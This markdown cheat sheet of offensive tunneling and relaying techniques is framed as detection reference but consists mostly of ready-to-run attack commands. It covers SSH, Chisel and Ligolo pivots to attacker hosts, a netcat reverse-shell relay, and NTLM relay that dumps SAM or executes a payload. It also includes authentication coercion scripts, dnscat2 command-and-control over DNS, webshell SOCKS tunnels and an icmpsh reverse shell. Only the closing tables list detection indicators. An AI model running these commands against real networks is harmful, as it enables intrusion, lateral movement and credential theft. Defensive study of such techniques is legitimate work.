# Tunneling & Relaying — Offensive Techniques & Commands

> Sources: RTFM v3, HackTricks, PayloadsAllTheThings, Chisel/Ligolo documentation
> Purpose: Know what tunnel/relay techniques attackers deploy so you can detect the artifacts.

---

## SSH Tunneling

### Local Port Forward (access remote service via local port)

```bash
# Forward local:8080 → target:80 through jump host
ssh -L 8080:target-internal:80 user@jumphost

# Forward local:3389 → RDP on internal host
ssh -L 3389:10.10.10.5:3389 user@pivot-host

# Multiple forwards
ssh -L 8080:web:80 -L 3306:db:3306 user@pivot

# Dynamic SOCKS proxy (all traffic through SSH)
ssh -D 1080 user@pivot-host
# Then configure proxychains: socks5 127.0.0.1 1080

# Background tunnel (no shell)
ssh -f -N -L 8080:internal:80 user@pivot
ssh -f -N -D 1080 user@pivot
```

### Remote Port Forward (expose internal service to attacker)

```bash
# Make internal service reachable on attacker's port
ssh -R 8443:127.0.0.1:443 attacker@attacker-server

# Expose victim's local port 3389 on attacker's server
ssh -R 4444:127.0.0.1:3389 user@attacker-vps

# Reverse SOCKS proxy (attacker uses victim as proxy)
ssh -R 1080 user@attacker-server
# On attacker: proxychains nmap -sT 10.10.10.0/24
```

### SSH Over Non-Standard Ports / Protocols

```bash
# SSH over port 443 (bypass firewall)
ssh -p 443 user@server

# SSH over HTTP proxy (using corkscrew/connect)
# ~/.ssh/config:
# Host target
#   ProxyCommand corkscrew proxy-host 8080 %h %p

# SSH over DNS (using iodine/dns2tcp)
iodined -f 10.0.0.1 tunnel.attacker.com  # server
iodine -f tunnel.attacker.com            # client
ssh user@10.0.0.1
```

---

## Chisel (Go-based HTTP Tunnel)

```bash
# On attacker (server):
./chisel server --reverse --port 8080

# On victim (client) — reverse SOCKS proxy:
./chisel client attacker-ip:8080 R:socks

# On victim — forward specific port:
./chisel client attacker-ip:8080 R:4444:127.0.0.1:3389

# On victim — forward multiple:
./chisel client attacker-ip:8080 R:4444:10.10.10.5:445 R:5555:10.10.10.5:3389

# SOCKS through chisel (on attacker, use proxychains on port 1080)
./chisel server --reverse --port 443 --socks5
./chisel client attacker:443 R:1080:socks
```

```powershell
# Windows chisel client
.\chisel.exe client attacker-ip:8080 R:socks
.\chisel.exe client attacker-ip:8080 R:4444:127.0.0.1:3389
```

---

## Ligolo-ng (Encrypted Tunnels)

```bash
# On attacker (proxy server):
./proxy -selfcert -laddr 0.0.0.0:11601

# On victim (agent):
./agent -connect attacker-ip:11601 -ignore-cert

# On attacker (after agent connects):
# In ligolo interface:
# session        — select agent session
# ifconfig       — show victim network interfaces
# start          — start tunnel
# Add route on attacker: sudo ip route add 10.10.10.0/24 dev ligolo

# Access internal network directly from attacker as if local
nmap -sT 10.10.10.0/24
crackmapexec smb 10.10.10.0/24
```

---

## Netcat & Socat Relays

### Netcat

```bash
# Simple relay (listener to listener)
# On pivot: forward port 4444 to internal target port 445
mkfifo /tmp/bp
nc -lvp 4444 < /tmp/bp | nc 10.10.10.5 445 > /tmp/bp

# Reverse shell relay
# Victim → Pivot → Attacker
# On pivot:
nc -lvp 4444 | nc attacker-ip 5555

# Port forward with ncat
ncat -lvp 8080 --sh-exec "ncat 10.10.10.5 80"
```

### Socat

```bash
# TCP port forward
socat TCP-LISTEN:8080,fork TCP:10.10.10.5:80

# TCP port forward (background)
socat TCP-LISTEN:4444,fork TCP:internal-host:3389 &

# Encrypted tunnel (TLS)
# Generate cert: openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -out cert.pem
socat OPENSSL-LISTEN:443,cert=cert.pem,verify=0,fork TCP:10.10.10.5:445

# UDP relay
socat UDP-LISTEN:53,fork UDP:10.10.10.1:53

# SOCKS proxy with socat (limited)
socat TCP-LISTEN:1080,fork SOCKS4A:proxy:target:port,socksport=1080
```

---

## Windows Built-in Tunneling

### netsh Port Proxy

```cmd
:: Forward local port to remote host (persists across reboots)
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=10.10.10.5

:: List all port proxies
netsh interface portproxy show all

:: Remove port proxy
netsh interface portproxy delete v4tov4 listenport=8080 listenaddress=0.0.0.0

:: Forward RDP to internal host
netsh interface portproxy add v4tov4 listenport=33389 listenaddress=0.0.0.0 connectport=3389 connectaddress=10.10.10.5
```

```powershell
# Same via PowerShell
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=10.10.10.5

# Check existing proxies
netsh interface portproxy show all
```

### SSH (OpenSSH for Windows)

```powershell
# Windows 10+ has OpenSSH client built-in
ssh -L 8080:internal:80 user@pivot -N -f
ssh -D 1080 user@pivot -N -f
ssh -R 4444:127.0.0.1:3389 attacker@attacker-vps -N -f
```

### Plink (PuTTY CLI)

```cmd
:: Local forward
plink.exe -ssh -L 8080:10.10.10.5:80 user@pivot -pw password -N

:: Dynamic SOCKS
plink.exe -ssh -D 1080 user@pivot -pw password -N

:: Reverse forward
plink.exe -ssh -R 4444:127.0.0.1:3389 user@attacker -pw password -N
```

---

## NTLM Relay

### Responder + ntlmrelayx

```bash
# Capture NTLM hashes (passive)
responder -I eth0 -wrf

# Relay NTLM to SMB (no SMB signing required)
ntlmrelayx.py -tf targets.txt -smb2support

# Relay NTLM to LDAP (for AD attacks)
ntlmrelayx.py -t ldap://dc01.domain.local --escalate-user hacker

# Relay to specific share and execute
ntlmrelayx.py -t smb://10.10.10.5 -e payload.exe

# Relay to dump SAM
ntlmrelayx.py -tf targets.txt -smb2support --dump-sam

# Coerce authentication (PetitPotam, PrinterBug, DFSCoerce)
python3 PetitPotam.py attacker-ip target-dc
python3 printerbug.py domain/user:password@target attacker-ip
python3 dfscoerce.py -u user -p password -d domain.local attacker-ip target-dc
```

### Windows NTLM Relay Tools

```powershell
# Inveigh (PowerShell responder equivalent)
Import-Module .\Inveigh.ps1
Invoke-Inveigh -ConsoleOutput Y -NBNS Y -mDNS Y -HTTPS Y -Proxy Y

# InveighZero (.NET)
.\Inveigh.exe
```

---

## SOCKS Proxying & Proxychains

```bash
# proxychains configuration (/etc/proxychains4.conf or ~/.proxychains/proxychains.conf)
# Add at bottom:
# socks5 127.0.0.1 1080

# Use proxychains with tools
proxychains nmap -sT -Pn 10.10.10.0/24 -p 445,3389,22
proxychains crackmapexec smb 10.10.10.0/24
proxychains evil-winrm -i 10.10.10.5 -u admin -p password
proxychains xfreerdp /v:10.10.10.5 /u:admin /p:password

# Multiple hops (chain proxies)
# proxychains.conf:
# socks5 127.0.0.1 1080  # first pivot
# socks5 127.0.0.1 1081  # second pivot (set chain_len = 2)
```

---

## DNS Tunneling

```bash
# iodine (IP-over-DNS)
# Server (attacker):
iodined -f -c -P password 10.0.0.1/24 tunnel.attacker.com
# Client (victim):
iodine -f -P password tunnel.attacker.com
# Result: TUN interface with 10.0.0.x IP, full TCP/IP over DNS

# dnscat2 (C2 over DNS)
# Server:
ruby dnscat2.rb tunnel.attacker.com
# Client:
./dnscat --dns=server=attacker-dns,domain=tunnel.attacker.com

# dns2tcp
# Server:
dns2tcpd -f /etc/dns2tcpd.conf
# Client:
dns2tcpc -r ssh -z tunnel.attacker.com attacker-dns
ssh -p 2222 user@127.0.0.1
```

---

## HTTP/HTTPS Tunneling

```bash
# Tunna (HTTP tunnel through webshell)
python2 proxy.py -u http://target/webshell.php -l 4444 -r 3389 -a 10.10.10.5

# reGeorg / Neo-reGeorg (SOCKS proxy via webshell)
python neoreg.py generate -k password
# Upload tunnel.php to target web server
python neoreg.py -k password -u http://target/tunnel.php -p 1080

# ABPTTS (A Black Path Toward The Sun)
python abpttsclient.py -c config.txt -u http://target/abptts.aspx -f 127.0.0.1:4444/10.10.10.5:3389

# Cobalt Strike / C2 over HTTP(S)
# Uses malleable C2 profiles to blend with normal HTTP traffic
```

---

## ICMP Tunneling

```bash
# ptunnel (ICMP tunnel)
# Server (on pivot):
ptunnel -x password
# Client:
ptunnel -p pivot-ip -lp 8080 -da target-ip -dp 3389 -x password
# Access: localhost:8080 → target:3389 over ICMP

# icmpsh (ICMP reverse shell)
# Attacker:
python icmpsh_m.py attacker-ip victim-ip
# Victim:
icmpsh.exe -t attacker-ip
```

---

## Detection Signatures

### Network Indicators

| Technique | What to look for |
|-----------|-----------------|
| SSH tunnels | Long-lived SSH connections, unusual SSH ports, SSH from servers that shouldn't SSH out |
| Chisel/Ligolo | HTTP UPGRADE to websocket on non-standard ports, binary transfer to endpoint, new listening ports |
| netsh portproxy | Registry: `HKLM\SYSTEM\CurrentControlSet\Services\PortProxy`, netsh commands in logs |
| NTLM relay | SMB connections without signing, NTLM auth to unexpected hosts, Responder-like broadcasts |
| DNS tunneling | High volume DNS queries, long subdomain labels (>30 chars), TXT record queries, unusual query frequency |
| ICMP tunneling | Large ICMP packets (>100 bytes), high ICMP frequency, ICMP to single destination |
| HTTP tunneling | Webshell files on web servers, unusual POST data sizes, persistent HTTP connections |
| SOCKS proxy | New listening ports on endpoints, proxychains artifacts, unusual outbound connections |
| Plink/PuTTY | plink.exe execution, PuTTY registry keys, SSH connections from Windows hosts |

### Host Indicators

| Technique | Artifacts |
|-----------|-----------|
| SSH tunnels | `.ssh/config` changes, ssh processes with -L/-R/-D flags, authorized_keys modifications |
| Chisel | chisel binary on disk, chisel process, websocket connections in proxy logs |
| Ligolo | agent binary on disk, outbound TCP to attacker on port 11601, new TUN interfaces |
| netsh portproxy | `netsh interface portproxy show all`, registry entries under PortProxy |
| Socat/Netcat | nc/ncat/socat processes, named pipes (mkfifo), listening on unexpected ports |
| DNS tunnel | iodine/dnscat2/dns2tcp binaries, TUN/TAP interfaces, DNS config changes |
| ICMP tunnel | ptunnel/icmpsh binaries, raw socket usage, high ICMP in netflow |
